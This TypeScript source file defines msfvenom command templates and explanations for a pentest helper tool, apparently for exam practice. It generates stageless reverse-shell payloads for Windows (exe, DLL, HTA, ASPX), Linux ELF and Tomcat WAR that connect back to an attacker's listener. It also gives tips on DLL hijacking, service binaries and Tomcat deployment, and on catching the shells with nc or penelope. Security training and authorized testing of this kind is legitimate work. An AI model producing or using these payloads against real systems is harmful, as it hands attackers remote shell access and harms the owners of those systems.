import type { PayloadDef, PayloadPart } from "./types";

/**
 * msfvenom runs on Kali, so every def is pasted at a bash prompt; `os` is the TARGET the file is for.
 * Stageless `shell_reverse_tcp` only: no meterpreter, no staged `shell/reverse_tcp` (exam rule).
 */
const NO_HANDLER = "Catch it with penelope, or nc; no multi/handler needed for stageless shell.";
const ARCH_NOTE = "Check the target first (systeminfo System Type / uname -m): an x64 file will not run on x86.";

function parts(payload: string, fmt: string, file: string, fmtExplain: string): PayloadPart[] {
  return [
    { token: "msfvenom", explain: "Metasploit's standalone payload generator. It only writes a file; Metasploit itself is not started." },
    { token: `-p ${payload}`, explain: "-p: the payload. The underscore in shell_reverse_tcp means stageless: the whole shell is in the file, so nc or penelope can catch it. A slash (shell/reverse_tcp) would be staged and die on nc." },
    { token: "LHOST={LHOST}", explain: "Your listener's IP, baked into the file. Use the tun0 address and regenerate after any VPN reconnect." },
    { token: "LPORT={LPORT}", explain: "The port your listener waits on, baked into the file." },
    { token: `-f ${fmt}`, explain: fmtExplain },
    { token: `-o ${file}`, explain: `-o: where msfvenom writes the result. Without it the bytes go to stdout and wreck your terminal. {FILE} (default ${file}) is the name the target will see; for DLL hijacking name it exactly as the DLL being searched for.` },
  ];
}

function def(
  id: string, title: string, os: "linux" | "windows", payload: string, fmt: string, file: string,
  fmtExplain: string, notes: string[] = [],
): PayloadDef {
  return {
    id, generator: "msfvenom", title, os, contexts: ["bash-prompt"], requires: ["served-file"],
    template: `msfvenom -p ${payload} LHOST={LHOST} LPORT={LPORT} -f ${fmt} -o {FILE}`,
    parts: parts(payload, fmt, file, fmtExplain),
    listeners: ["penelope", "rlwrap-nc"], msfPayload: payload, bakesIp: true, defaults: { FILE: file },
    notes: [NO_HANDLER, ...notes],
  };
}

const WIN64 = "windows/x64/shell_reverse_tcp";
const JAVA = "java/jsp_shell_reverse_tcp";
const WAR_NOTE = "Deploy through the Tomcat manager (or drop in webapps/), then browse to /rev/ to fire it.";
const WAR_FMT = "-f war: a deployable Tomcat archive wrapping the JSP shell.";

export const MSFVENOM: PayloadDef[] = [
  def("msf-win-x64-exe", "Windows x64 exe", "windows", WIN64, "exe", "rev.exe",
    "-f exe: a Windows PE executable. For a service binary use exe-service instead, or the service dies with error 1053.", [ARCH_NOTE]),
  def("msf-win-x64-dll", "Windows x64 DLL", "windows", WIN64, "dll", "rev.dll",
    "-f dll: a Windows DLL for hijacking or `rundll32 rev.dll,<export>`. The host process must be x64 to load it.", [ARCH_NOTE]),
  def("msf-win-x64-hta", "Windows x64 HTA", "windows", WIN64, "hta-psh", "rev.hta",
    "-f hta-psh: an HTML Application that launches the shell through PowerShell when opened with mshta.", [ARCH_NOTE]),
  def("msf-win-x86-exe", "Windows x86 exe", "windows", "windows/shell_reverse_tcp", "exe", "rev32.exe",
    "-f exe: a Windows PE executable (32-bit here, so it also runs on x64 through WOW64).", ["x86 for Veil/Shellter"]),
  def("msf-linux-x64-elf", "Linux x64 ELF", "linux", "linux/x64/shell_reverse_tcp", "elf", "rev.elf",
    "-f elf: a Linux executable. chmod +x it on the target before running.", [ARCH_NOTE]),
  def("msf-win-x64-aspx", "Windows x64 ASPX", "windows", WIN64, "aspx", "rev.aspx",
    "-f aspx: an ASP.NET page that runs the shell when requested. Upload to an IIS site that executes .aspx.", [ARCH_NOTE]),
  // PayloadDef.os is a single value, so the OS-agnostic WAR is listed once per OS: a Windows Tomcat host
  // must not fold it as "Wrong OS", and a Linux one must not either.
  def("msf-java-war-linux", "Java WAR (Tomcat on Linux)", "linux", JAVA, "war", "rev.war", WAR_FMT, [WAR_NOTE, "Same payload as the Windows entry; listed per OS so the fit filter keeps it."]),
  def("msf-java-war-windows", "Java WAR (Tomcat on Windows)", "windows", JAVA, "war", "rev.war", WAR_FMT, [WAR_NOTE, "Same payload as the Linux entry; listed per OS so the fit filter keeps it."]),
];
